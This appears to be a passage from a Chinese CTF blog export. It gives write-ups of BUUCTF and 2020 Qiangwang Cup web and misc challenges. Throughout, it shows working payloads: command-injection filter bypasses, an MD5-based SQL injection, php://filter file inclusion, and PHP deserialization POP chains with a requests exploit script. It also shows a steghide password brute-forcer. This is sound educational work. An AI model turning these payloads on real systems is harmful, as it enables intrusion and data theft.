class="php">strcmp($_POST[&#39;money&#39;],100000000)==0</code></pre><p>利用strcmp()函数的松散性，传入数组返回NULL，即变成了NULL==0，为真。于是可以传入数组<code>money[]=1</code>，使得上面比较为真<br>最终payload：</p><pre><code class="php">Cookie: user=1post传参： money[]=1&amp;password=404%00</code></pre><h3 id="0x15-ZJCTF-2019-NiZhuanSiWei"><a href="#0x15-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="0x15 [ZJCTF 2019]NiZhuanSiWei"></a>0x15 [ZJCTF 2019]NiZhuanSiWei</h3><p><strong>考点：代码审计+伪协议+文件包含+PHP反序列化</strong><br>打开题目，发现源码</p><pre><code class="php"> &lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;)){    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file)){        echo &quot;Not now!&quot;;        exit();     }else{        include($file);  //useless.php        $password = unserialize($password);        echo $password;    }}else{    highlight_file(__FILE__);}?&gt; </code></pre><p>代码审计一下：</p><blockquote><p>1.get传入text、file和password并赋值给相应变量。如果设置了text，且text的文件内容为welcome to the zjctf，输出text的文件内容<br>2.如果file传入的值(即<code>$file</code>)含有flag，输出Not now!，结束；否则包含<code>$file</code>，<code>$password</code>进行反序列化并输出</p></blockquote><p>于是有以下思路：</p><pre><code class="php">text=php://input //利用伪协议，将post传入值当作文件内容post: welcome to the zjctffile=php://filter/read=convert.base64-encode/resource=useless.php //利用伪协议读文件内容password=1 //待定，先设为1。猜测useless.php存在反序列化漏洞</code></pre><p>get传参访问，得到base64编码后的useless.php的文件内容。Base64解码得到：</p><pre><code class="php">&lt;?phpclass Flag{  //flag.php      public $file;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  }  ?&gt;  </code></pre><p>很明显存在反序列化漏洞，于是构造poc：</p><pre><code class="php">&lt;?phpclass Flag{  //flag.php      public $file=&quot;flag.php&quot;;      public function __tostring(){          if(isset($this-&gt;file)){              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        }      }  }$test1=new Flag;print_r(serialize($test1));?&gt;  </code></pre><p>由poc生成exp:</p><pre><code class="php">O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>最终得到payload：</p><pre><code class="php">?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}post：welcome to the zjctf</code></pre><p>传入参数，访问，查看源代码发现flag。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>百题刷题记录总结持续更新。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020强网杯部分题总结与复现</title>
      <link href="/2020/08/31/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/08/31/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>前几天打了个两天一夜的强网杯比赛，整个人都快要起飞了。趁着闲暇之余，总结和复现一下部分题。</p><h3 id="0x01-强网先锋：主动"><a href="#0x01-强网先锋：主动" class="headerlink" title="0x01 强网先锋：主动"></a>0x01 强网先锋：主动</h3><p><strong>考点：命令执行+绕过黑名单</strong><br>题目源码：</p><pre><code class="php">&lt;?phphighlight_file(&quot;index.php&quot;);if(preg_match(&quot;/flag/i&quot;, $_GET[&quot;ip&quot;])){    die(&quot;no flag&quot;);}system(&quot;ping -c 3 $_GET[ip]&quot;);?&gt; </code></pre><p>很简单的一个过滤了flag关键字的命令执行，，直接拼接绕过即可：<br>payload</p><pre><code class="php">?ip=|ls?ip=;a=g;cat fla$a.php</code></pre><h3 id="0x02-强网先锋：Funhash"><a href="#0x02-强网先锋：Funhash" class="headerlink" title="0x02 强网先锋：Funhash"></a>0x02 强网先锋：Funhash</h3><p><strong>考点：magic hash+弱类型</strong><br>题目源码：</p><pre><code class="php">&lt;?phpinclude &#39;conn.php&#39;;highlight_file(&quot;index.php&quot;);//level 1if ($_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;])){    die(&#39;level 1 failed&#39;);}//level 2if($_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;])){    die(&#39;level 2 failed&#39;);}//level 3$query = &quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;;$result = $mysqli-&gt;query($query);$row = $result-&gt;fetch_assoc(); var_dump($row);$result-&gt;free();$mysqli-&gt;close();?&gt; </code></pre><p>一共三关：</p><pre><code class="php">level1：绕过$_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;])level2：绕过$_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;])level3：绕过SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;</code></pre><p><strong>第一关：level1</strong><br>level1的意思是：找到一个值，md4加密前后相等，才能绕过。<br>谷歌搜索得到相关知识：<a href="https://crdx.org/post/hsctf-2019-md5-minus-minus" target="_blank" rel="noopener">HSCTF 2019: MD5–</a><br>主要就是利用了PHP的特性，绕过hash1。<br>里边有一个暴力破解PHP脚本：</p><pre><code class="php">$i = 0;$c = 0;while (true) {    if ((++$c % 1000000) == 0) {        printf(&quot;.&quot;);    }    $n = &quot;0e&quot; . $i++;    $h = hash(&#39;md4&#39;, $n);    if ($n == $h) {        printf(&quot;\nFound: $n\n&quot;);        break;    }}</code></pre><p><code>$i</code>每次迭代数值加1，然后对生成的<code>0e</code>前缀字符串<code>$n</code>进行哈希处理和比较。字符串从<code>0e1</code>开始，然后继续进行，直到找到匹配项为止。每百万次迭代将一个点打印到屏幕上标记进度。<br>运行一段时间得到第一个正确的<code>0e</code>字符串：</p><pre><code class="php">Found: 0e251288019</code></pre><p>pyload1</p><pre><code class="php">?hash1=0e251288019</code></pre><p>然后就成功绕过了level1。<br><strong>第二关：level2</strong><br>level2的意思是：(用了<code>===</code>)让传入的两个值不相等且md5加密后相等，才能绕过。<br>利用md5无法处理数组的特性，使用数组绕过<br>pyload2</p><pre><code class="php">?hash1=0e251288019&amp;hash2[]=2&amp;hash3[]=3</code></pre><p><strong>第三关：level3</strong><br>level3的意思是：绕过<code>md5($_GET[&quot;hash4&quot;],true)</code>实现SQL注入。</p><pre><code class="bash">利用字符串：ffifdyopmd5后，276f722736c95d99e921722cf9ed621c再转成字符串： &#39;or&#39;6</code></pre><p>最终pyload:</p><pre><code class="php">?hash1=0e251288019&amp;hash2[]=2&amp;hash3[]=3&amp;hash4=ffifdyop</code></pre><h3 id="0x03-强网先锋：web辅助"><a href="#0x03-强网先锋：web辅助" class="headerlink" title="0x03 强网先锋：web辅助"></a>0x03 强网先锋：web辅助</h3><p><strong>考点：pop链+反序列化逃逸+代码审计</strong><br>题目给了源码，审计代码：</p><pre><code class="php">//index.php&lt;?php@error_reporting(0);require_once &quot;common.php&quot;;require_once &quot;class.php&quot;;if (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])){    $username = $_GET[&#39;username&#39;];    $password = $_GET[&#39;password&#39;];    $player = new player($username, $password); //实例化class.php的player类得到对象    file_put_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]), write(serialize($player)));    //将$player序列化    //write增两个字符    //file_put_contents()函数把序列化结果写入文件中    echo sprintf(&#39;Welcome %s, your ip is %s\n&#39;, $username, $_SERVER[&#39;REMOTE_ADDR&#39;]);}else{    echo &quot;Please input the username or password!\n&quot;;}?&gt;</code></pre><pre><code class="php">//class.php&lt;?phpclass player{    protected $user;    protected $pass;    protected $admin;    public function __construct($user, $pass, $admin = 0){ //构造函数        $this-&gt;user = $user;        $this-&gt;pass = $pass;        $this-&gt;admin = $admin;    }    public function get_admin(){        return $this-&gt;admin; //定义get_admin()函数，返回$admin变量    }}class topsolo{    protected $name;    public function __construct($name = &#39;Riven&#39;){        $this-&gt;name = $name;    }    public function TP(){        if (gettype($this-&gt;name) === &quot;function&quot; or gettype($this-&gt;name) === &quot;object&quot;){        //gettype获取变量的类型            $name = $this-&gt;name;            $name();   //1、将实例化对象name当作方法使用，触发midsolo类里的__invoke()        }    }    public function __destruct(){//析构函数，反序列化时调用TP()函数        $this-&gt;TP();    }}class midsolo{    protected $name;    public function __construct($name){        $this-&gt;name = $name;    }    public function __wakeup(){//属性个数的值大于真实属性个数跳过__wakeup()函数        if ($this-&gt;name !== &#39;Yasuo&#39;){            $this-&gt;name = &#39;Yasuo&#39;;            echo &quot;No Yasuo! No Soul!\n&quot;;        }    }    public function __invoke(){        $this-&gt;Gank();//调用Gank()函数    }    public function Gank(){        if (stristr($this-&gt;name, &#39;Yasuo&#39;)){//2、进行字符串比较触发jungle类里的__toString()            echo &quot;Are you orphan?\n&quot;;        }        else{            echo &quot;Must Be Yasuo!\n&quot;;        }    }}class jungle{    protected $name = &quot;&quot;;    public function __construct($name = &quot;Lee Sin&quot;){        $this-&gt;name = $name;    }    public function KS(){        system(&quot;cat /flag&quot;);    }    public function __toString(){        $this-&gt;KS(); //调用KS()函数，得到flag        return &quot;&quot;;      }}?&gt;</code></pre><pre><code class="php">//common.php&lt;?phpfunction read($data){    $data = str_replace(&#39;\0*\0&#39;, chr(0).&quot;*&quot;.chr(0), $data); //\0*\0替换成0*0吃掉两个字符    return $data;}function write($data){    $data = str_replace(chr(0).&quot;*&quot;.chr(0), &#39;\0*\0&#39;, $data); //0*0替换成\0*\0 增加两个字符    return $data;}function check($data){    if(stristr($data, &#39;name&#39;)!==False){ //$data不能包含name        die(&quot;Name Pass\n&quot;);    }    else{        return $data;    }}?&gt;</code></pre><pre><code class="php">//play.php&lt;?php@error_reporting(0);require_once &quot;common.php&quot;;require_once &quot;class.php&quot;;@$player = unserialize(read(check(file_get_contents(&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])))));//file_get_contents将文件读入字符串//调用check检查name，调用read吃两个字符print_r($player);if ($player-&gt;get_admin() === 1){ //调用player类的get_admin()函数，获得$admin    echo &quot;FPX Champion\n&quot;;}else{    echo &quot;The Shy unstoppable\n&quot;;}?&gt;</code></pre><p>写一下每个文件里的大致意思：</p><pre><code class="bash">index.php1、在 index.php get传入username和password参数，分别赋值给$username和$password变量然后将变量传入class.php的player类2、对$player进行序列化；增两个字符；写入caches目录下的(ip进行md5加密)的文件名class.php3、player类：声明三个保护字段$user、$pass和$admin。构造函数： $user=$username；$pass=$password；$admin=0get_admin()函数：返回$admin变量到调用位置(即，play.php中判断返回$admin是否为1)4、topsolo类：声明保护字段$name构造函数：$name=&#39;Riven&#39;析构函数：调用TP()函数；反序列化时调用TP()函数：判断$name变量类型，若为函数或对象触发__invoke()魔术方法5、midsolo类：__wakeup()魔术方法：属性个数的值大于真实属性个数跳过__invoke()魔术方法：调用Gank()函数Gank()函数：进行字符串比较触发__toString()魔术方法6、jungle类：__toString()魔术方法：调用KS()函数KS()函数：执行系统命令得到flagplay.php7、读取caches目录下文件名是md5加密ip得到的文件；检查不能包含name字符串；\0*\0替换成0*0吃掉两个字符；反序列化8、调用player类的get_admin()函数，获得$admin需等于1common.php9、定义read()函数、write()函数和check()函数read()函数：\0*\0替换成0*0吃掉两个字符write()函数：0*0替换成\0*\0 增加两个字符check()函数：$data不能包含name字符串执行顺序可能是：1-&gt;2-&gt;(9)-&gt;7-&gt;(9)-&gt;3-&gt;   4-&gt;5-&gt;68-&gt;3</code></pre><p>审计完代码后，发现<code>class.php</code>里的topsolo类、midsolo类和jungle类可以构造出打印flag的pop链：</p><blockquote><p>topsolo类里析构函数调用<code>TP()</code>函数，<code>TP()</code>函数判断<code>$name</code>变量类型，若为函数或对象触发midsolo类里的<code>__invoke()</code>魔术方法；<code>__invoke()</code>魔术方法调用<code>Gank()</code>函数，<code>Gank()</code>函数进行字符串比较触发jungle类里的<code>__toString()</code>魔术方法；<code>__toString()</code>魔术方法调用<code>KS()</code>函数，<code>KS()</code>函数执行得到flag的系统命令。</p></blockquote><p>构造POP链进行序列化：</p><pre><code class="php">&lt;?phpclass topsolo{    protected $name=&quot;Riven&quot;;    public function __construct(){        $this-&gt;name = new midsolo();    }}class midsolo{    protected $name;    public function __construct(){        $this-&gt;name = new jungle();    }}class jungle{    protected $name = &quot;Lee Sin&quot;;    public function __toString(){        system(&quot;cat /flag&quot;);        return &quot;&quot;;      }}$hack=new topsolo();print_r(serialize($hack));?&gt;</code></pre><p>序列化结果为：</p><pre><code class="php">//protected变量序列化后需要在变量前的星号*左右手动添加不可见字符%00，使其成为%00*%00O:7:&quot;topsolo&quot;:1:{s:7:&quot;%00*%00name&quot;;O:7:&quot;midsolo&quot;:1:{s:7:&quot;%00*%00name&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;%00*%00name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>同样对player类进行序列化，得到序列化后的结果：</p><pre><code class="php">O:6:&quot;player&quot;:3:{s:7:&quot;%00*%00user&quot;;N;s:7:&quot;%00*%00pass&quot;;N;s:8:&quot;%00*%00admin&quot;;i:1;}</code></pre><p>源码中只对player类进行反序列化，<code>read()</code>函数将<code>\0*\0</code>替换成<code>0*0</code>吃掉两个字符，于是考虑使用字符串逃逸，破坏序列化字符串的结构，吃掉一部分。<br>pop链序列化字符串长度为109<br><strong>方法一</strong>：<br>吃掉的字符串为<code>&quot;;s:7:&quot;%00*%00pass&quot;;s:109:&quot;</code>，长度为23。进行一次<code>read()</code>函数可以吃掉两个字符，需进行11.5次，很明显不可以。<br>在吃掉的字符串后补一位，即吃掉的字符串为<code>&quot;;s:7:&quot;%00*%00pass&quot;;s:109:&quot;1</code>，长度为24。read()函数进行12次，也就是需要12个<code>%00*%00</code>。<br><img src="http://img-blog.csdnimg.cn/20200825170213122.png#pic_center" alt="在这里插入图片描述"><br><strong>方法二</strong>：<br>吃掉的字符串为<code>&quot;;s:7:&quot;%00*%00pass&quot;;s:109:</code>，长度为22。read()函数进行11次，也就是需要11个<code>%00*%00</code>。<br><img src="http://img-blog.csdnimg.cn/20200825164918924.png#pic_center" alt="在这里插入图片描述"><br>还需要注意的是要跳过midsolo类里的__wakeup()魔术方法，将原本属性个数的值1改大一些，如：2<br>源码中check函数过滤了关键字<code>name</code>，将序列化字符串中表示变量(名)为字符串的小写<code>s</code>换为大写<code>S</code>，即可解析变量(名)中的16进制<code>\6e\61\6d\65</code>(即name)。因为<code>read()</code>函数是将<code>\0*\0</code>替换成<code>0*0</code>吃掉两个字符，所以需要将username里的<code>%00</code>换成<code>\0</code>，password里为了防止被吃，不要换或将<code>%00</code>换成<code>\00</code>。<br><strong>方法一构造payload</strong>：<br>需要read()函数进行12次，也就是需要12个<code>%00*%00</code></p><pre><code class="php">username=qwzf\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0password=1&quot;;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;%00*%00\6e\61\6d\65&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;%00*%00\6e\61\6d\65&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;%00*%00\6e\61\6d\65&quot;;s:7:&quot;Lee Sin&quot;;}}};s:8:&quot;\00*\00admin&quot;;i:1;}将%00换成\00的(注意将1&quot;;s:7换成1&quot;;S:7   暂时不晓得为什么):1&quot;;S:7:&quot;\00*\00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00\6e\61\6d\65&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00\6e\61\6d\65&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00\6e\61\6d\65&quot;;s:7:&quot;Lee Sin&quot;;}}};s:8:&quot;\00*\00admin&quot;;i:1;}</code></pre><p>这样就成功将pop链序列化的结果填入了password中，使其被反序列化，打印flag。<br>也可以进行url编码(也可以不用编码)一下，得到最终payload：</p><pre><code class="php">username=qwzf%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0password=1%22;s:7:%22%00*%00pass%22;O:7:%22topsolo%22:1:{S:7:%22%00*%00%5C6e%5C61%5C6d%5C65%22;O:7:%22midsolo%22:2:{S:7:%22%00*%00%5C6e%5C61%5C6d%5C65%22;O:6:%22jungle%22:1:{S:7:%22%00*%00%5C6e%5C61%5C6d%5C65%22;s:7:%22Lee Sin%22;}}};s:8:%22%5C00*%5C00admin%22;i:1;}</code></pre><p><strong>方法二构造payload</strong>：<br>原理类似，吃的字符数不同。需要read()函数进行11次，也就是需要11个<code>%00*%00</code></p><pre><code class="php">username=qwzf\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0password=;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;%00*%00\6e\61\6d\65&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;%00*%00\6e\61\6d\65&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;%00*%00\6e\61\6d\65&quot;;s:7:&quot;Lee Sin&quot;;}}};S:8:&quot;%00*%00admin&quot;;i:0;}</code></pre><p>传入后访问play.php，进行反序列化，得到flag。<br>为了方便直接写了个exp<br>exp：</p><pre><code class="py">import requestsurl=&quot;http://eci-2ze4mvter6u4z188kpmz.cloudeci1.ichunqiu.com/&quot;users=&quot;?username=qwzf%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0%5C0*%5C0&quot;pwds=&#39;&amp;password=1%22;S:7:%22%5C00*%5C00pass%22;O:7:%22topsolo%22:1:{S:7:%22%5C00*%5C00%5C6e%5C61%5C6d%5C65%22;O:7:%22midsolo%22:2:{S:7:%22%5C00*%5C00%5C6e%5C61%5C6d%5C65%22;O:6:%22jungle%22:1:{s:7:%22%5C00*%5C00%5C6e%5C61%5C6d%5C65%22;s:7:%22Lee Sin%22;}}};S:8:%22%5C00*%5C00admin%22;i:1;}&#39;#传入payloadurls=url+ users + pwdsr=requests.get(urls)print(r.text)#访问play.php吃掉字符，输出进行反序列化后的结果res=requests.get(url+&quot;play.php&quot;)print(res.text)</code></pre><p>运行得到flag<br><img src="http://img-blog.csdnimg.cn/20200825021958693.jpg#pic_center" alt="在这里插入图片描述"></p><h3 id="0x04-强网先锋：upload"><a href="#0x04-强网先锋：upload" class="headerlink" title="0x04 强网先锋：upload"></a>0x04 强网先锋：upload</h3><p><strong>考点：流量分析+steghide隐写</strong><br>下载解压题目，是一个流量包，筛选协议为http的流量包。发现<br><img src="http://img-blog.csdnimg.cn/20200825015332622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>意思应该就是使用了steghide隐写，并且是含有密码的。查看下一个数据包，发现里面隐藏了一张jpg图片，提取出来<br><img src="http://img-blog.csdnimg.cn/20200825015531105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因为没找到密码，所以直接使用steghide隐写工具不能提取出隐藏内容。<br>考虑使用脚本爆破密码：</p><pre><code class="py">#python3运行from subprocess import *def foo():    stegoFile=&#39;1.jpg&#39;#隐写的图片    extractFile=&#39;passwd.txt&#39;#爆破的密码    passFile=&#39;dic.txt&#39;#字典    errors=[&#39;could not extract&#39;,&#39;steghide --help&#39;,&#39;Syntax error&#39;]    cmdFormat=&#39;steghide extract -sf &quot;%s&quot; -xf &quot;%s&quot; -p &quot;%s&quot;&#39;    f=open(passFile,&#39;r&#39;)    for line in f.readlines():        cmd=cmdFormat %(stegoFile,extractFile,line.strip())        p=Popen(cmd,shell=True,stdout=PIPE,stderr=STDOUT)        content=str(p.stdout.read(),&#39;gbk&#39;)        for err in errors:            if err in content:                break        else:            print (content),            print (&#39;the passphrase is %s&#39; %(line.strip()))            f.close()            returnif __name__ == &#39;__main__&#39;:    foo()    print (&#39;ok&#39;)    pass</code></pre><p><img src="http://img-blog.csdnimg.cn/20200825015617815.png" alt="在这里插入图片描述"><br>爆破得到密码123456，然后使用steghide工具提取含有密码的隐藏内容</p><pre><code class="bash">steghide extract -sf 1.jpg -p 123456</code></pre><p>得到flag</p><h3 id="0x05-强网先锋：bank"><a href="#0x05-强网先锋：bank" class="headerlink" title="0x05 强网先锋：bank"></a>0x05 强网先锋：bank</h3><p><strong>考点：爆破hash+逻辑漏洞</strong><br>nc连过去发现是只有得到XXX，才能进行下一步。<br>找脚本爆破前三位即可，注意速度要快，因为这个nc连接每隔一会儿就会断</p><pre><code class="py">#python2运行#-*- coding:utf-8 -*-import stringimport hashlibimport timeimport threadingimport sysstring = input(&quot;your str：&quot;)sha256 = input(&quot;your sha256：&quot;)strr=&quot;ABCDEFGHIJKMLNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;def main1(asc1):    def main2(asc2):        def main3(asc3):                asc = asc1+asc2+asc3                proof=asc+string                digest = hashlib.sha256(proof.encode(&#39;utf-8&#39;)).hexdigest()                if digest == sha256:                    zhi =&#39;\n\n\n\n\n\n\n\n\n\n-------------------------------------\n&#39;+proof+&#39;\n&#39;+digest+&#39;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&#39;                    f = open(&quot;zhi.txt&quot;,&#39;w&#39;)                    f.write(zhi)                    f.close()                    print(&#39;\n\n\n\n\n\n\n\n\n\n-------------------------------------&#39;)                    print(proof+&#39;\n&#39;+digest+&#39;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&#39;)                    sys.exit(0)                    return                 #else:                    #day = time.asctime(time.localtime(time.time()))                    #print &quot;当前时间为：&quot; + day+&#39;\n&#39;                    #print proof+&quot;\n&quot;+digest+&quot;\n&quot;        for asc3 in strr:            t3 = threading.Thread(target=main3,args=(asc3,))            t3.start()    for asc2 in strr:        t2 = threading.Thread(target=main2,args=(asc2,))        t2.start()for asc1 in strr:    t1 = threading.Thread(target=main1,args=(asc1,))    t1.start()</code></pre><p>输入爆破出的XXX的值；然后输入队伍token。hint提示的是AES ECB模式加密(可能这才是预期解)。<br>发现需要买flag，需要1000现金，而自己有10现金。涉及现金，队友想到可能有逻辑漏洞，随便输入负数，发现自己的现金增加了。输入<code>qwzf -995</code>，和之前的10相加，够1000现金了，get flag，支付现金得到flag。</p><h3 id="0x06-Web：half-infiltration"><a href="#0x06-Web：half-infiltration" class="headerlink" title="0x06 Web：half_infiltration"></a>0x06 Web：half_infiltration</h3><p><strong>考点：反序列化+内网攻击</strong><br>题目源码(自己添加注释后的)：</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);$flag=file_get_contents(&#39;ssrf.php&#39;);class Pass{    function read()    {        ob_start(); //打开输出控制缓冲        global $result; //函数内部的global,在函数内部的为局部变量，与外部互不干涉        print $result;    }}class User{    public $age,$sex,$num;    function __destruct()//析构函数，反序列化时调用    {        $student = $this-&gt;age; //将$age赋值给$student        $boy = $this-&gt;sex;     //将$sex赋值给$boy        $a = $this-&gt;num;       //将$num赋值给$a    $student-&gt;$boy();          //$student以对象调用的方式调用$boy方法    if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))    {        ob_end_clean(); //清空缓冲区并关闭输出缓冲        exit();    }    global $$a; //函数内部的global，声明可变变量    $result=$GLOBALS[&#39;flag&#39;]; //当前页面的全局变量$key = value的引用，即引用$flag的值        ob_end_clean();    }}if (isset($_GET[&#39;x&#39;])) {    echo &quot;&lt;br /&gt;&quot;.$_GET[&#39;x&#39;].&quot;&lt;br /&gt;&quot;;    $q=unserialize($_GET[&#39;x&#39;])-&gt;get_it();    print_r($q);}?&gt;</code></pre><p>构造poc</p><pre><code class="php">&lt;?php$qwzf = new User;$qwzf-&gt;age = new Pass;$qwzf-&gt;sex = &#39;read&#39;;$qwzf-&gt;num = &#39;result&#39;;$c = new User;$c-&gt;age = new Pass;$c-&gt;sex = &#39;read&#39;;$c-&gt;num = this;$test = serialize([$qwzf,$c]);var_dump($test);</code></pre><p>由于是第五空间do you know原题改的，所以直接修改payload得到：</p><pre><code class="php">a:3:{i:0;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;boy&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:6:&quot;result&quot;;}i:0;O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;O:4:&quot;Pass&quot;:0:{}s:3:&quot;boy&quot;;s:4:&quot;read&quot;;s:3:&quot;num&quot;;s:4:&quot;this&quot;;}i:0;s:4:&quot;AAAA&quot;;}</code></pre><p>将payload传入，查看源代码，发现<br><img src="http://img-blog.csdnimg.cn/20200825025036876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进了内网，内网服务没做出来。找到大师傅的博客如下：<br><a href="https://www.gem-love.com/ctf/2576.html#halfinfiltration" target="_blank" rel="noopener">2020第四届“强网杯”全国网络安全挑战赛初赛Writeup</a></p><h3 id="0x07-MISC：miscstudy"><a href="#0x07-MISC：miscstudy" class="headerlink" title="0x07 MISC：miscstudy"></a>0x07 MISC：miscstudy</h3><p><strong>考点：流量分析+TLS解密+Base64+二进制作像素点画图+jphide隐写+文件分离+crc32碰撞+明文攻击+Python3盲水印+snow在html嵌入隐写信息</strong><br><strong>第一关</strong><br>筛选http数据包，得到<code>39.99.247.28/fonts/1</code><br><img src="http://img-blog.csdnimg.cn/2020083023502813.png" alt="在这里插入图片描述"><br>访问得到<code>flag{level1_begin_and_level2_is_come</code><br><img src="http://img-blog.csdnimg.cn/2020083023515257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>第二关</strong><br>第一关的内容，查询发现是TLS密文日志，保存到一个文件里。使用TLS密文日志在Wirshark解密流量：<br>打开Wireshark-&gt;编辑-&gt;首先项-&gt;Protocols-&gt;TLS-&gt;选择TLS密文日志文件<br><img src="http://img-blog.csdnimg.cn/20200831000414984.png" alt="在这里插入图片描述"><br>筛选http数据包，得到<code>47.244.9.130/images/4e5d47b2db53654959295bba216858932.png</code><br><img src="http://img-blog.csdnimg.cn/20200831000313193.png" alt="在这里插入图片描述"><br>访问得到一张图片，右键保存到本地。winhex打开发现后半部分有可疑信息IDAT，并且最后面的IDAT和IEND之间的信息应该是Base64编码：<code>bGV2ZWwzX3N0YXJ0X2l0</code><br><img src="http://img-blog.csdnimg.cn/20200831001242881.png" alt="在这里插入图片描述"><br>Base64解码得到：<code>level3_start_it</code><br><strong>第三关</strong><br>第二关发现的可疑IDAT，在上边还有3段，分别进行base64解码得到3600二进制数。想到利用脚本转化为图片。并且应该是像素点画图，1RGB值为(0,0,0)，0RGB值为(255,255,255)。拿个大师傅的脚本：</p><pre><code class="py">from PIL import ImageMAX = 60pic = Image.new(&quot;RGB&quot;,(MAX, MAX))data = &quot;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111110000000100110000100000000011100001111111111100001111111111110000000110111000100000000011100001111111111100001100000000110010011111110010000000001100111001000000000100001100000000110010000110110010000000000001111001000000000100001100111100110010000100110010011100000011101001001111100100001100111100110000100000001110011111110010000001001111100100001100111100110000000000001110011110110010000001001111100100001100111100110011100100111111111100110011100000001111100100001100000000110011000000000111100110110110000001000000000100001100000000110010011000000011100011111110011001000000000100001111111111110010011001001001100110110010011001111111111100001111111111110010011001001100000100110010011001111111111100000000000000000010011111110010011000111000100000000000000000000000000000000010001111100010011000011101100000000000000000001110011000111100000001000000011000001111111001111000111000000110000000000000000001000000011000000000011001000000000000000010000001000011100001000000111100110000011000000010000000001110011001111110000000000000010001001110011111000010011000001110011001111110000000000000011001001110011111000010011000001100111000000011111000000010000100000100100111000000100100000001100000000111011000000111000100001100000111000000000000000011100000111110011000001111111100001100011111110010000000000000111001001100000000001100000111001110011111001000100100000000111001001000000000001000000111001110011111001100100100000011